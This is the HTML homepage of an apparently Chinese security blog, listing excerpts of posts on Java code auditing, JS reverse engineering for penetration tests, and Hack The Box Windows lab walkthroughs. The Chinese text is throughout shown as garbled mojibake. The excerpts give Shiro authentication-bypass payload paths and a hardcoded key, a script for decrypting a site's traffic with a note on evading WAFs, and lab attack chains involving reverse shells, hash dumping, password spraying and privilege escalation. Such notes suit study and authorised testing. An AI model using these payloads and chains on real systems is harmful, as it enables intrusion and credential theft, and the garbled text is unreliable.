<!doctype html><html lang=en dir=auto><head><meta name=generator content="Hugo 0.135.0"><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>å…»çŒªæ—¥è®°</title>
<meta name=keywords content="Blog"><meta name=description content="å…»çŒªæ—¥è®°"><meta name=author content="å…»çŒªæ—¥è®°"><link rel=canonical href=https://yangzhuzai.github.io/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate type=application/rss+xml href=https://yangzhuzai.github.io/index.xml><link rel=alternate type=application/json href=https://yangzhuzai.github.io/index.json><link rel=alternate hreflang=en href=https://yangzhuzai.github.io/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="å…»çŒªæ—¥è®°"><meta property="og:description" content="å…»çŒªæ—¥è®°"><meta property="og:type" content="website"><meta property="og:url" content="https://yangzhuzai.github.io/"><meta property="og:image" content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="og:site_name" content="å…»çŒªæ—¥è®°"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="å…»çŒªæ—¥è®°"><meta name=twitter:description content="å…»çŒªæ—¥è®°"><script type=application/ld+json>{"@context":"https://schema.org","@type":"Organization","name":"å…»çŒªæ—¥è®°","url":"https://yangzhuzai.github.io/","description":"å…»çŒªæ—¥è®°","thumbnailUrl":"https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E","sameAs":[]}</script></head><body class=list id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://yangzhuzai.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://yangzhuzai.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://yangzhuzai.github.io/categories/ title=åˆ†ç±»><span>åˆ†ç±»</span></a></li><li><a href=https://yangzhuzai.github.io/search/ title=æœç´¢><span>æœç´¢</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class="first-entry home-info"><header class=entry-header><h1>Hi there ğŸ‘‹</h1></header><div class=entry-content>Welcome to my blogï¼Œéšæ‰‹å†™ç‚¹å„¿</div><footer class=entry-footer><div class=social-icons></div></footer></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>ä»£ç å®¡è®¡æ€»ç»“</h2></header><div class=entry-content><p>å‰è¨€ Javaå®‰å…¨æ˜¯ä¸€ä¸ªæ¯”è¾ƒåºå¤§çš„ä¸œè¥¿ï¼Œå•è®ºJavaä»£ç å®¡è®¡æ‰€éœ€è¦çš„çŸ¥è¯†ç‚¹å…¶å®è¾ƒä¸ºç®€å•ï¼ŒJavaå®‰å…¨ç ”ç©¶ä¼šæ¯”è¾ƒæ·±å…¥ï¼Œå…¶å®å¯ä»¥è¿™ä¸¤è€…å¯ä»¥è¾ƒä¸ºæ˜æ˜¾çš„åŒºåˆ†å¼€æ¥ï¼Œä¸€ä¸ªä¸ºäº†ä¸šåŠ¡æœåŠ¡ï¼Œä¸€ä¸ªä¸ºäº†æ·±å…¥æŒ–æ˜ã€‚å•è®ºå®‰å…¨æœåŠ¡ä»¥åŠæ¸—é€æµ‹è¯•çš„ç¨‹åº¦ï¼Œä¸šåŠ¡å±‚é¢çš„Javaä»£ç å®¡è®¡è¶³ä»¥ã€‚å¦‚æœæ˜¯è¦æ·±å…¥ç ”ç©¶çš„è¯ï¼Œæ„šè§è®¤ä¸ºï¼Œä¸åŒçš„å²—ä½å†³å®šå¯¹çŸ¥è¯†çš„æŒæ¡æ·±åº¦ï¼Œå½“å‰å²—ä½å¦‚æœæœ‰æ·±å…¥éœ€æ±‚å†è€ƒè™‘ã€‚ä»¥ä¸‹æ–‡ç« å†…å®¹ä»…ä»å¿«é€Ÿå®Œæˆä»£ç å®¡è®¡çš„è§†è§’å‡ºå‘ï¼Œä¸æ¶‰åŠæ·±å…¥çš„æ¼æ´ç ”ç©¶ã€‚
å¸¸è§ç»„ä»¶æ¼æ´ 1ã€Shiro shiroçš„æ¼æ´ä¸»è¦æ˜¯ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯ç¡¬ç¼–ç ï¼Œä¸€ä¸ªæ˜¯æƒé™ç»•è¿‡ï¼š
ç¡¬ç¼–ç ï¼š ç¡¬ç¼–ç æ¼æ´å¤§å®¶éƒ½çŸ¥é“é—®é¢˜å‡ºåœ¨rememberMeåŠŸèƒ½ä¸Šï¼Œå¯¹äºshiroè€Œè¨€ï¼Œé…ç½®rememberMeçš„æ–¹æ³•å¤§è‡´å¦‚ä¸‹ï¼š
securityManager.setRememberMeManager(rememberMeManager());//è®¾ç½®rememberMeManager() å…³é”®è¯ï¼šsetRememberMeManager å…·ä½“å®ç°ï¼š public CookieRememberMeManager rememberMeManager() { CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager(); cookieRememberMeManager.setCookie(rememberMeCookie()); cookieRememberMeManager.setCipherKey(Base64.decode("fCq+/xW488hMTCD+cmJ3aQ==")); return cookieRememberMeManager; } æœç´¢å¯†é’¥å…³é”®è¯ï¼šsetCipherKey shiroè¿˜å¯ä»¥é€šè¿‡é…ç½®æ–‡ä»¶çš„æ–¹å¼è¿›è¡Œé…ç½®ï¼ŒåŒæ ·å¯ä»¥æœç´¢å…³é”®è¯ï¼š org.apache.shiro.web.mgt.DefaultWebSecurityManager org.apache.shiro.web.mgt.CookieRememberMeManager æ¡ˆä¾‹ï¼š
æƒé™ç»•è¿‡ï¼š CVE æè¿° å½±å“èŒƒå›´ payload CVE-2020-1957 æƒé™ç»•è¿‡ Shiro &lt; 1.5.2 /xxx/..;/admin/ CVE-2020-11989 CVE-2020-1957è¡¥ä¸ç»•è¿‡ Shiro &lt; 1.5.3 /;/admin/page CVE-2020-13933 CVE-2020-11989è¡¥ä¸ç»•è¿‡ Shiro &lt; 1.6.0 /admin/%3bpage CVE-2020-17523 æƒé™ç»•è¿‡ Shiro &lt; 1.7.1 /admin/%20 /admin/%2e shiroé…ç½®è·¯å¾„åŒ¿åè®¿é—®çš„æ–¹æ³•å¤§æ¦‚å¦‚ä¸‹ï¼š
...</p></div><footer class=entry-footer><span title='2024-12-19 14:25:59 +0800 CST'>December 19, 2024</span>&nbsp;Â·&nbsp;4 min&nbsp;Â·&nbsp;837 words&nbsp;Â·&nbsp;å…»çŒªæ—¥è®°</footer><a class=entry-link aria-label="post link to ä»£ç å®¡è®¡æ€»ç»“" href=https://yangzhuzai.github.io/posts/java/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>001 JSé€†å‘</h2></header><div class=entry-content><p>å‰è¨€ å®æˆ˜æ¸—é€é¡¹ç›®å¾ˆå¤šæ—¶å€™éƒ½èƒ½é‡åˆ°æ•°æ®åŒ…åŠ å¯†çš„æƒ…å†µï¼Œå¾ˆå¤šæ—¶å€™ä¼šè§‰å¾—æ£˜æ‰‹ï¼Œå› ä¸ºå¾ˆå¤šæ”¹åŒ…çš„åŠ¨ä½œæ— æ³•å®ç°ï¼Œä½†æ˜¯è¿™æ ·ä¸å®Œå…¨æ˜¯åå¤„ï¼Œç‰¹åˆ«æ˜¯ä¸€äº›å‚æ•°åŠ å¯†çš„æ—¶å€™ï¼Œç”±äºæ•°æ®åŒ…åŠ å¯†ï¼Œæ‰€ä»¥ä»–ä»¬å¤©ç„¶å­˜åœ¨WAFç»•è¿‡ï¼Œå°†æˆ‘ä»¬çš„payloadåŠ å…¥JSåŠ å¯†çš„æ–‡æœ¬ä¸­ä¼ è¾“ï¼ŒWAFå‡ ä¹å¾ˆéš¾è¯†åˆ«ã€‚
ç›®å‰æœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼Œä¸€ç§æ˜¯æ‰£JSä»£ç ï¼Œè·å–æ‰€æœ‰çš„åŠ å¯†å‡½æ•°ï¼Œä¸­é—´å¾ˆå®¹æ˜“é‡åˆ°å‡½æ•°åµŒå¥—ï¼Œé™·å…¥æ‰£ä»£ç çš„å›°å±€ï¼Œè¿˜æœ‰ä¸€ç§æ˜¯JS-RPCçš„è§£å†³æ–¹æ¡ˆï¼Œè¯¦æƒ…å¯ä»¥å‚è€ƒï¼š
https://xz.aliyun.com/t/14629?time__1311=GqAhYK0KBKAIP05DKBOxmODRrzc6LK%3D63x#toc-2 JS-RPCï¼Œè¯¦æƒ…æŸ¥çœ‹ä½¿ç”¨æ–¹å¼é…åˆä¸Šæ–‡é£Ÿç”¨ï¼š
https://github.com/jxhczhl/JsRpc ç®€å•è®°å½•ä¸€äº›é‡åˆ°çš„ç½‘ç«™ï¼Œä»¥åŠå¦‚ä½•é…åˆburpæ’ä»¶ï¼Œæ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œæ¸—é€ï¼š
ä¸€ã€å¸¸è§„æ‰£ä»£ç è§£å¯† è¿”å›æ•°æ®åŒ…ä¸­å¸¦æœ‰encrypt_dataï¼š
æµè§ˆå™¨ctrl+shift+fæœç´¢encrypt_dataï¼Œæ‰¾åˆ°å¯¹åº”çš„JSä»£ç æ–‡ä»¶ï¼Œæ‰¾åˆ°ç¬¦åˆè¦æ±‚çš„ï¼Œå¿…é¡»ä¸ºæŸæ–¹æ³•ï¼Œå…¨éƒ¨åŒ…å«è¯¥å‚æ•°çš„ï¼Œè€Œéåªå–æŸä¸ªå€¼ï¼Œæ‰“ä¸Šæ–­ç‚¹å¯ä»¥çœ‹URLæ˜¯å¦æ­£ç¡®ï¼Œä»¥åŠå‚æ•°æ˜¯å¦å¯¹åº”ï¼š
æ§åˆ¶å°å†æ¬¡ç¡®è®¤å‚æ•°æ˜¯å¦æ‰¾æ­£ç¡®äº†ï¼š
æºç é‡Œé¢ç‚¹è¿›å»ï¼Œæ‰¾åˆ°ç›¸å…³å‡½æ•°ï¼š
æŠŠç›¸å…³çš„å†…å®¹æ”¾åˆ°æœ¬åœ°è¿›è¡Œè°ƒè¯•ï¼š
è¿™é‡Œå‡ºç°é”™è¯¯ï¼ŒWæœªå®šä¹‰ï¼š
æŠŠWä¹Ÿå¤åˆ¶è¿‡æ¥ï¼š
ç»§ç»­æŠŠJä¹Ÿå¤åˆ¶è¿‡æ¥ï¼Œä¸­é—´è¿˜ä¼šé‡åˆ°å¥½å‡ ä¸ªå‡½æ•°ç¼ºå¤±ï¼Œéƒ½å¤åˆ¶è¿‡æ¥å³å¯ï¼š
è¿™é‡Œå°±ç®—æ˜¯é€†å‘å®Œæˆäº†ï¼Œæ¥ä¸‹æ¥å°±è¦åšä»£ç å±‚é¢çš„åµŒå…¥äº†ï¼Œç”¨pythonçš„execjsåº“å³å¯ï¼š
pip install pyexecjs2
demo01.py
import requests
import execjs
headers = {
'accept': 'application/json, text/plain, */*',
'accept-language': 'zh-CN',
'cache-control': 'no-cache',
'content-type': 'application/x-www-form-urlencoded',
'origin': 'https://rxxx',
'pragma': 'no-cache',
'priority': 'u=1, i',
'referer': 'https://xxx/',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'cross-site',
'user-agent': 'Mozilla/5.0Ã‚\xa0(compatible;Ã‚\xa0Baiduspider-render/2.0;Ã‚\xa0+http://www.baidu.com/search/spider.html)',
}
data = {
'page': '1',
'num': '8',
'type': 'æ¦œå•',
}
response = requests.post('https://xxxn/web/webSiteCaNews', headers=headers, data=data)
encrypt_data= response.json()['encrypt_data']
print(encrypt_data)
decrypt = execjs.compile(open('./demo01.js', 'r', encoding='utf-8').read()).call('Z',encrypt_data)
print(decrypt) demo01.js
...</p></div><footer class=entry-footer><span title='2024-10-18 14:25:59 +0800 CST'>October 18, 2024</span>&nbsp;Â·&nbsp;10 min&nbsp;Â·&nbsp;2028 words&nbsp;Â·&nbsp;å…»çŒªæ—¥è®°</footer><a class=entry-link aria-label="post link to 001 JSé€†å‘" href=https://yangzhuzai.github.io/posts/skill/001-js%E9%80%86%E5%90%91/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>0X000 HTB windowsé¶æœºæ€»ç»“</h2></header><div class=entry-content><p>ä¸ªäººæ‰“é¶ç»å†ï¼Œä¸è¿½æ±‚å®Œç¾ï¼Œåªæ˜¯è®°å½•ï¼Œæ—©äº›è®°å½•è¾ƒä¸ºç²—ç³™ï¼Œè§è°…ã€‚
0x001ï¼šBastard ä¸­ç­‰ éåŸŸ æ¸—é€è·¯çº¿ï¼šdrupal webæ¼æ´â€“>fuzzç«¯ç‚¹â€“>ä¿®æ”¹pocâ€“>getshellâ€“>ææƒä½¿ç”¨winpeassâ€“>ms15-051
è€ƒç‚¹ï¼šdrupalæ¼æ´ä¿¡æ¯æŸ¥æ‰¾ã€fuzzçš„ç†è§£ã€pocç†è§£å’Œä½¿ç”¨
0x002ï¼šArctic ç®€å• éåŸŸ æ¸—é€æ€è·¯ï¼šç«¯å£æ‰«ææ— æœâ€“>httpè®¿é—®â€“>å‘ç°adobe coldfusionâ€“>æ¼æ´ä¿¡æ¯æŸ¥æ‰¾â€“>æ¼æ´åˆ©ç”¨getshgellâ€“>ææƒä½¿ç”¨winpeassâ€“>ms16-032
è€ƒç‚¹ï¼šè¾ƒä¸ºç®€å•ï¼Œæ€è·¯å¸¸è§„ï¼Œæ­£å¸¸æ¸—é€å³å¯å®Œæˆ
0x003ï¼šDevel ç®€å• éåŸŸ æ¸—é€æ€è·¯ï¼šFTPåŒ¿åç™»å½•â€“>å‘ç°webç½‘ç«™å’ŒåŒ¿åç™»å½•ç›®å½•ä¸€è‡´â€“>ç”Ÿæˆaspæœ¨é©¬åå¼¹shellâ€“>ææƒä½¿ç”¨winpeassâ€“>ms16-032
è€ƒç‚¹ï¼šè¾ƒä¸ºç®€å•ï¼Œæ€è·¯å¸¸è§„ï¼Œæ­£å¸¸æ¸—é€å³å¯å®Œæˆ
0x004ï¼šBastion ä¸­ç­‰ éåŸŸ æ¸—é€æ€è·¯ï¼šsmbåŒ¿åè®¿é—®â€“>windows image backup â€“>å‘ç°vhdçš„å¤‡ä»½æ–‡ä»¶ â€“>å‘ç°æ˜¯Cç›˜â€“>å¯¼å‡ºSAMå’ŒSYSTEMæ–‡ä»¶â€“>è¯»å–hashâ€“>ç ´è§£â€“>ææƒ
ææƒæ— æ³•ç›´æ¥é€šè¿‡è„šæœ¬æç¤ºï¼Œéœ€è¦æŸ¥æ‰¾è½¯ä»¶ç›®å½•ï¼Œå‘ç°éå¸¸è§„è½¯ä»¶mRemoteNGâ€”>ä¿¡æ¯æŸ¥æ‰¾ï¼Œå‘ç°è¯¥è½¯ä»¶å¯èƒ½å­˜åœ¨å¯†ç è¯»å–çš„æƒ…å†µâ€“>æ¼æ´åˆ©ç”¨ï¼Œæå–administratorå¯†ç æˆåŠŸ
è€ƒç‚¹ï¼šVHDç¡¬ç›˜å¤‡ä»½ã€samæ–‡ä»¶è¯»å–ã€mRemoteNGå¯†ç æå–ï¼›çŸ¥è¯†ç‚¹ç›²åŒºæ˜¯æœ¬é¶åœºçš„æ ¸å¿ƒé—®é¢˜ã€‚
0x005ï¼šBlue ç®€å• éåŸŸ æ¸—é€æ€è·¯ï¼šnmapå‘Šè¯‰å­˜åœ¨ms17-010â€“>éœ€è¦äº†è§£pythonå¦‚ä½•å®ç°ms17-010
è€ƒç‚¹ï¼šåœ¨ä¸ä¾èµ–msfçš„æƒ…å†µä¸‹ï¼Œå¦‚ä½•æ‰“ms17-010
0x006ï¼šBounty ç®€å• éåŸŸ æ¸—é€æ€è·¯ï¼šç›®å½•æ‰«æå‘ç°ä¸Šä¼ åŠŸèƒ½â€“>ä½†æ˜¯æ— æ³•ä¸Šä¼ æ­£å¸¸çš„åç¼€â€“>é€šè¿‡fuzzå‘ç°å¯ä¸Šä¼ .configåç¼€â€“>è¯¥åç¼€åœ¨II7.0ä»¥ä¸Šå¯ä»¥getshellâ€“>ææƒms16-032
è€ƒç‚¹ï¼šconfig getshell
0x007ï¼šAcute å›°éš¾ åŸŸæ¸—é€ï¼ˆéå¸¸è§„æ‰“æ³•ï¼‰ ç«¯å£æ‰«æï¼š
å‘ç°443 httpsç«¯å£ï¼Œæµè§ˆå™¨è®¿é—®å¤±æ•ˆï¼Œé€šè¿‡è¯ä¹¦å‘ç°åŸŸåï¼Œä¿®æ”¹hostsæ–‡ä»¶ï¼ŒæˆåŠŸè®¿é—®åˆ°äº†ç½‘é¡µã€‚
webæ¸—é€ï¼š
é¦–é¡µabout usï¼Œæ³„éœ²éƒ¨åˆ†å‡ºåå‘˜å·¥åç§°ï¼ŒåŒæ—¶æœ‰ä¸ªæ–°äººè¡¨å•ï¼Œé€šè¿‡æ–°äººè¡¨å•ï¼Œå¯ä»¥å‘ç°PSWAå…¥å£ä»¥åŠé»˜è®¤å¯†ç ï¼šPassword1!ï¼Œä»¥åŠåˆ›å»ºè€…ä¸»æœºä¿¡æ¯ï¼šAcute-PC01ä»¥åŠLoisç”¨æˆ·æ˜¯ç½‘ç«™ç®¡ç†å‘˜ç­‰ä¿¡æ¯ï¼›é€šè¿‡æ³„éœ²çš„å‘˜å·¥åï¼Œæ‹¼æ¥é¦–å­—æ¯å’Œåé¢çš„åï¼Œä½¿ç”¨é»˜è®¤å¯†ç ï¼ŒæˆåŠŸæ’åº“PSWAï¼Œè·å–ç«‹è¶³ç‚¹powershellï¼Œæ™®é€šæƒé™ï¼Œç”¨æˆ·åï¼šacute\edaviesã€‚
åæ¸—é€é˜¶æ®µï¼š
è¿™å°é¶æœºç›®å‰æœ€å¥½è¿˜æ˜¯ä½¿ç”¨meterpreterï¼Œå®Œå…¨é¿å…ä½¿ç”¨meterpreterçš„è¯ï¼Œä¼šèŠ±è´¹å·¨é‡æ—¶é—´ï¼Œä»¥åŠéƒ¨åˆ†åŠŸèƒ½å¯èƒ½æ— æ³•é€šè¿‡è„šæœ¬å®ç°ã€‚
åæ¸—é€-æ¨ªå‘ç§»åŠ¨é˜¶æ®µ1ï¼š
é€šè¿‡æŸ¥çœ‹å½“å‰çš„è¿œç¨‹ç™»å½•ä¼šè¯ï¼Œå¯ä»¥å‘ç°ç›®å‰çš„ç”¨æˆ·acute\edaviesæ˜¯ä½¿ç”¨äº†RDPçš„ï¼Œä½¿ç”¨meterpreterçš„å±å¹•ç›‘æ§åŠŸèƒ½ï¼ŒæŸ¥çœ‹å½“å‰ç”¨æˆ·çš„æ“ä½œï¼Œå‘ç°äº†å¦å¤–ä¸€å°ä¸»æœºåä¸ºï¼šATSSERVERï¼Œä»¥åŠä¸€ä¸ªç›¸å…³å‡­è¯ï¼šå¯†ç ï¼šW3_4R3_th3_f0rce.ç”¨æˆ·ï¼šacute\imonksï¼Œä½¿ç”¨powershellï¼Œç”³è¯·å‡­è¯ï¼Œè·å–åˆ°ATSSERVERæ™®é€šæƒé™ï¼Œå¯ä»¥æ‹¿åˆ°ç¬¬ä¸€ä¸ªuser.txtï¼ŒåŒæ—¶ä½¿ç”¨è¿™ä¸ªç”¨æˆ·å¯ä»¥å‘ç°Program Filesç›®å½•ä¸‹æœ‰ä¸ªkeepmeonç›®å½•ï¼Œæ˜¯ç”¨æˆ·å®‰è£…çš„ï¼Œéå¸¸è§„è½¯ä»¶ç›®å½•ï¼Œä½†æ˜¯å½“å‰\imonksç”¨æˆ·æ²¡æœ‰æƒé™è¿›å…¥ã€‚
åæ¸—é€-æ¨ªå‘ç§»åŠ¨é˜¶æ®µ2ï¼š
åœ¨ç¬¬ä¸€ä¸ªuser.txtçš„é™„è¿‘æœ‰ä¸»æœºAcute-PC01çš„è„šæœ¬ä¿¡æ¯ï¼Œè™½ç„¶å¯†ç è¿›è¡Œäº†åŠ å¯†ï¼Œä½†æ˜¯å¯ä»¥ä¿®æ”¹è„šæœ¬è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœï¼Œåå¼¹ä¸€ä¸ªè„šæœ¬å†…ç”¨æˆ·çš„æƒé™ä¸ºï¼šacute\jmorganï¼Œå±äºæœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·ç»„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æ‹¿åˆ°äº†Acute-PC01ä¸»æœºçš„ç®¡ç†å‘˜æƒé™ã€‚
åæ¸—é€-æ¨ªå‘ç§»åŠ¨é˜¶æ®µ3ï¼š
ä½¿ç”¨Acute-PC01ä¸»æœºçš„ç®¡ç†å‘˜æƒé™dumphashï¼Œæ‹¿åˆ°æœ¬åœ°administratorçš„å¯†ç ï¼Œä½†æ˜¯æ— æ³•ç™»å½•ATSSERVERï¼Œç”±äºæˆ‘ä»¬ä¹‹å‰æ‹¥æœ‰ATSSERVERçš„imonksç”¨æˆ·ï¼Œé€šè¿‡æŸ¥çœ‹ç”¨æˆ·ç›®å½•ï¼Œå¯ä»¥çŸ¥é“è¯¥ä¸»æœºæœ‰å“ªäº›ç”¨æˆ·ç™»å½•è¿‡äº†ï¼Œä½¿ç”¨Acute-PC01ä¸»æœºçš„å¯†ç è¿›è¡Œå–·æ´’ï¼ŒæˆåŠŸè·å–äº†ä¸€ä¸ªåä¸ºawallaceçš„ç”¨æˆ·ã€‚
åæ¸—é€-æ¨ªå‘ç§»åŠ¨é˜¶æ®µ4ï¼š
awallaceç”¨æˆ·å¯ä»¥è¿›å»keepmeonç›®å½•ï¼Œè¿™ä¸ªç›®å½•ä¸‹é¢æœ‰ä¸ªbatæ–‡ä»¶ï¼Œå†…å®¹ä¸ºè®¡åˆ’ä»»åŠ¡ï¼Œæ‰§è¡Œè€…ä¸ºLoisï¼Œè¯¥ç”¨æˆ·æ˜¯æœ€å¼€å§‹å‘Šè¯‰æˆ‘ä»¬çš„ç½‘ç«™ç®¡ç†å‘˜ï¼ŒåŒæ—¶åœ¨åŸŸå†…æŸ¥æ‰¾ç”¨æˆ·ç»„ï¼Œå¯ä»¥å‘ç°ï¼Œsite_adminç”¨æˆ·ç»„ï¼Œè¯¥ç”¨æˆ·ç»„å±äºdomain admin groupç”¨æˆ·ç»„ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªè®¡åˆ’ä»»åŠ¡å¯ä»¥è®©æˆ‘ä»¬è·å¾—åŸŸç®¡ç†å‘˜ç»„æƒé™ï¼Œåˆ©ç”¨è¿™ä¸ªBATææƒæˆåŠŸï¼Œå³å¯è·å¾—ATSSERVERä¸»æœºçš„ç®¡ç†å‘˜æƒé™ï¼Œæ‹¿åˆ°æœ€ç»ˆçš„flag.
è€ƒç‚¹ï¼š1ã€ä¿¡æ¯æ”¶é›†ï¼›2ã€pswaï¼›3ã€powershellç†Ÿç»ƒåº¦ï¼›4ã€å†…ç½‘ä¿¡æ¯æ”¶é›†ï¼Œå¯†ç è·å–ï¼›5ã€è®¡åˆ’ä»»åŠ¡ææƒ
æ”¾åœ¨æœ€åï¼šè¿™ä¸ªé¶æœºçš„æ‰“æ³•åŠå…¶éå¸¸è§„ï¼Œæœ€å¼€å§‹çš„ä¿¡æ¯æ”¶é›†ä¾¿åœ¨ä¸€ç›´æŒ‘æˆ˜æ‰“é¶è€…çš„æ€è·¯å®Œå–„ç¨‹åº¦ï¼Œå†…ç½‘çš„ææƒå’Œä¿¡æ¯æ”¶é›†è¿‡ç¨‹ï¼Œæ›´æ˜¯æŠŠä¸¤ä¸ªæœºå™¨å½“æˆä¸€ä¸ªæ•´ä½“çš„æ€ç»´åœ¨è¿›è¡Œæ¸—é€ï¼Œä¿¡æ¯æ”¶é›†çš„ç¨‹åº¦å ªç§°ç¦»è°±ï¼Œpowershellçš„ç†Ÿæ‚‰ç¨‹åº¦ä¹Ÿæ˜¯ä¸€ä¸ªä¸å°çš„æŒ‘æˆ˜ï¼Œæœ€åçš„æ¥å›æ¨ªè·³å·¨çˆ½ã€‚
0x008ï¼šTimelapse ç®€å• åŸŸæ¸—é€ æ¸—é€æ€è·¯ï¼š smbåŒ¿åè®¿é—®â€“>zipæ–‡ä»¶â€“>ç ´è§£å‘ç°pfxæ–‡ä»¶â€“>å†æ¬¡ç ´è§£â€“>æå–å‡ºç§é’¥å’Œå…¬é’¥â€“>wirmç™»å½•â€“>ææƒï¼Œé€šè¿‡æŸ¥çœ‹powershellå†å²è®°å½•ï¼Œå‘ç°è´¦å·å¯†ç â€“>å‘ç°è¯¥è´¦å·å…·æœ‰laps_readersç»„æƒé™ï¼Œå¯ä»¥è¯»å–administraorå¯†ç 
è€ƒç‚¹ï¼š1ã€PFXï¼›2ã€laps_readers
0x009ï¼šStreamIO ä¸­ç­‰ åŸŸæ¸—é€ æ¸—é€æ€è·¯ï¼š webæ¸—é€â€“>æ³¨æ„è¯ä¹¦çš„åŸŸåå˜åŒ–â€“>å†æ¬¡ç›®å½•æ‰«æâ€“>å‘ç°sqlæ³¨å…¥â€“>è·å–ç½‘ç«™çš„ç”¨æˆ·åå’Œå¯†ç â€“>é€šè¿‡burpçˆ†ç ´ï¼ŒæˆåŠŸè·å–åˆ°åˆæ³•ç”¨æˆ·â€“>è¿›å…¥åå°ï¼Œæ³¨æ„urlå­˜åœ¨?â€“>fuzzå‘ç°debugå‚æ•°â€“>æ˜¯ä¸ªæ–‡ä»¶åŒ…å«ï¼Œéœ€è¦ä½¿ç”¨base64å¸¦å‡ºâ€“>è¿™é‡Œçš„æ€è·¯æœ‰ç‚¹éå¸¸è§„ï¼Œçˆ†ç ´å½“å‰ç›®å½•ï¼Œå‘ç°master.phpï¼Œè¯»å–å®ƒâ€“>å‘ç°å®ƒæ¥æ”¶postæäº¤çš„å‚æ•°ï¼Œå¹¶æ‰§è¡Œâ€“>é€šè¿‡æ–‡ä»¶åŒ…å«ï¼Œå¹¶æºå¸¦å‚æ•°ï¼Œå‘½ä»¤æ‰§è¡Œåå¼¹shellâ€“>è¯»å–æ•°æ®åº“è´¦å·å¯†ç â€“>winrmç™»å½•â€“>è¯»å–æµè§ˆå™¨å¯†ç â€“>è·å–åˆ°JDgoddç”¨æˆ·æƒé™â€“>ä¿®æ”¹CORE STAFFç»„çš„æ‹¥æœ‰è€…ä¸ºJDgoddï¼ŒæŠŠè‡ªå·±æ·»åŠ åˆ°ç»„å†…ï¼Œå¹¶ä¿®æ”¹daclï¼Œè¯»å–å¯†ç 
